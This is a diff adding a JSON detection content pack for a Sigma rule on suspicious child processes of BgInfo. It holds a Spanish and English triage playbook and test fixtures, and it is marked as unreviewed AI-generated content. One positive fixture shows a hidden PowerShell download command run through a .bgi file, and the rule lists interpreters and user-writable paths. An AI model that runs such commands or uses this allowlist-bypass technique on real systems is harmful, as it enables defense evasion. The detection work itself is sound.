@@ -1,0 +1,134 @@
+{
+  "rule": {
+    "id": "811f459f-9231-45d4-959a-0266c6311987",
+    "title": "Suspicious Child Process Of BgInfo.EXE",
+    "level": "high",
+    "status": "test",
+    "author": "Nasreddine Bencherchali (Nextron Systems)",
+    "path": "windows/process_creation/proc_creation_win_bginfo_suspicious_child_process.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_bginfo_suspicious_child_process.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1059.005",
+      "T1202",
+      "T1218"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "BgInfo.exe o BgInfo64.exe (Sysinternals) inició un intérprete, una utilidad sospechosa o un ejecutable ubicado en una ruta escribible por el usuario. Esto puede indicar que se usó BgInfo para ejecutar código de forma indirecta mediante un VBScript incrustado en un archivo .bgi.",
+      "what_it_detects": "Eventos de creación de procesos cuyo ParentImage termina en \\bginfo.exe o \\bginfo64.exe y cuyo Image es calc, cmd, cscript, mshta, notepad, powershell, pwsh o wscript, o bien un binario ubicado en AppData, Users\\Public, Temp, Windows\\Temp o PerfLogs.",
+      "why_it_matters": "BgInfo es un binario firmado y confiable que puede evaluar VBScript desde campos personalizados de un archivo .bgi. Un atacante puede usarlo para evadir listas blancas de aplicaciones y ejecutar comandos de forma indirecta (T1218, T1202, T1059.005).",
+      "triage_steps": [
+        "Revise ParentImage y la línea de comandos del proceso padre: identifique el archivo .bgi cargado y opciones como /popup, /nolicprompt o /timer:0.",
+        "Verifique Image y CommandLine del hijo: busque PowerShell codificado, descargas, mshta con URL o binarios recién creados en AppData o Temp.",
+        "Ubique el archivo .bgi en disco, obtenga su hash y revise los campos personalizados con VBScript. Confirme quién lo creó y cuándo.",
+        "Compruebe si la ruta y la firma de BgInfo corresponden a la instalación administrada, o si se trata de una copia dejada en una carpeta de usuario.",
+        "Pivote en el mismo host +/- 15 minutos: procesos hijos y nietos, conexiones de red, archivos escritos y claves Run o tareas programadas creadas.",
+        "Revise la cuenta de usuario y la sesión de inicio (interactiva, remota o servicio) y busque alertas previas sobre el mismo host o usuario.",
+        "Busque en el resto de la flota el mismo hash del .bgi o del ejecutable hijo."
+      ],
+      "false_positives": [
+        "Scripts de inicio de sesión de TI que usan BgInfo con campos VBScript legítimos que invocan cmd o PowerShell para recopilar datos del equipo.",
+        "Administradores que prueban configuraciones .bgi o abren el resultado en notepad durante soporte técnico."
+      ],
+      "response_steps": [
+        "Valide con el equipo de TI si el archivo .bgi y su ejecución están aprobados; documente las excepciones legítimas por ruta y hash.",
+        "Si es malicioso, aísle el endpoint y termine el árbol de procesos después de preservar la evidencia (memoria, .bgi, binarios hijos).",
+        "Elimine el .bgi malicioso, los payloads y los mecanismos de persistencia identificados; restablezca las credenciales de la cuenta afectada.",
+        "Restrinja BgInfo a rutas administradas mediante AppLocker o WDAC y monitoree los archivos .bgi fuera de las ubicaciones aprobadas."
+      ],
+      "severity_rationale": "El nivel alto es adecuado porque BgInfo rara vez lanza intérpretes o binarios desde rutas temporales, y esa combinación coincide con una técnica conocida de evasión de controles."
+    },
+    "en": {
+      "summary": "Sysinternals BgInfo.exe or BgInfo64.exe started a script interpreter, a suspicious utility or a binary from a user-writable path. This may mean BgInfo was used to proxy execution through VBScript embedded in a .bgi file.",
+      "what_it_detects": "Process creation where ParentImage ends with \\bginfo.exe or \\bginfo64.exe and Image is calc, cmd, cscript, mshta, notepad, powershell, pwsh or wscript, or a binary located under AppData, Users\\Public, Temp, Windows\\Temp or PerfLogs.",
+      "why_it_matters": "BgInfo is a signed, trusted binary that can evaluate VBScript from custom fields in a .bgi file. Attackers can abuse it to bypass application allowlisting and run commands indirectly (T1218, T1202, T1059.005).",
+      "triage_steps": [
+        "Check ParentImage and the parent's command line: identify the loaded .bgi file and switches such as /popup, /nolicprompt or /timer:0.",
+        "Review the child Image and CommandLine: look for encoded PowerShell, downloads, mshta with a URL, or freshly dropped binaries in AppData or Temp.",
+        "Locate the .bgi file, hash it and inspect custom fields containing VBScript. Determine who created it and when.",
+        "Confirm whether BgInfo's path and signature match the managed deployment or whether it is a copy dropped in a user folder.",
+        "Pivot on the same host +/- 15 minutes: child and grandchild processes, network connections, file writes, Run keys or scheduled tasks.",
+        "Review the user account and logon type (interactive, remote, service) and look for earlier alerts on the same host or user.",
+        "Hunt fleet-wide for the same .bgi or child executable hash."
+      ],
+      "false_positives": [
+        "IT logon scripts using BgInfo with legitimate VBScript fields that call cmd or PowerShell to collect system information.",
+        "Administrators testing .bgi configurations or opening output in notepad during support work."
+      ],
+      "response_steps": [
+        "Confirm with IT whether the .bgi file and its execution are approved; document legitimate exceptions by path and hash.",
+        "If malicious, isolate the endpoint and kill the process tree after preserving evidence (memory, .bgi, child binaries).",
+        "Remove the malicious .bgi, payloads and identified persistence; reset credentials for the affected account.",
+        "Restrict BgInfo to managed paths with AppLocker or WDAC and monitor .bgi files outside approved locations."
+      ],
+      "severity_rationale": "High fits because BgInfo rarely spawns interpreters or binaries from temporary paths, and the combination matches a known defense-evasion technique."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "BgInfo64 loading a .bgi from a user folder spawns PowerShell",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "ParentImage": "C:\\Users\\jperez\\Downloads\\Bginfo64.exe",
+          "ParentCommandLine": "\"C:\\Users\\jperez\\Downloads\\Bginfo64.exe\" C:\\Users\\jperez\\Downloads\\config.bgi /popup /nolicprompt",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "CommandLine": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"Invoke-WebRequest -Uri https://example.com/a.txt -OutFile $env:TEMP\\a.txt\"",
+          "IntegrityLevel": "Medium"
+        }
+      },
+      {
+        "description": "BgInfo launches an executable dropped in AppData\\Local",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0207.andes.example.com",
+          "User": "ANDES\\mrojas",
+          "ParentImage": "C:\\Tools\\Sysinternals\\bginfo.exe",
+          "ParentCommandLine": "C:\\Tools\\Sysinternals\\bginfo.exe C:\\Tools\\Sysinternals\\custom.bgi /timer:0 /nolicprompt",
+          "Image": "C:\\Users\\mrojas\\AppData\\Local\\Temp\\updsvc.exe",
+          "CommandLine": "C:\\Users\\mrojas\\AppData\\Local\\Temp\\updsvc.exe",
+          "IntegrityLevel": "Medium"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "BgInfo starting conhost from System32, which is not a listed child or suspicious path",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "ParentImage": "C:\\Program Files\\Sysinternals\\Bginfo64.exe",
+          "ParentCommandLine": "\"C:\\Program Files\\Sysinternals\\Bginfo64.exe\" \\\\fs01.andes.example.com\\netlogon\\corp.bgi /timer:0 /silent /nolicprompt",
+          "Image": "C:\\Windows\\System32\\conhost.exe",
+          "CommandLine": "\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1",
+          "IntegrityLevel": "Medium"
+        }
+      },
+      {
+        "description": "PowerShell launched by explorer.exe, not by BgInfo",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "ParentImage": "C:\\Windows\\explorer.exe",
+          "ParentCommandLine": "C:\\Windows\\Explorer.EXE",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "CommandLine": "powershell.exe",
+          "IntegrityLevel": "Medium"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
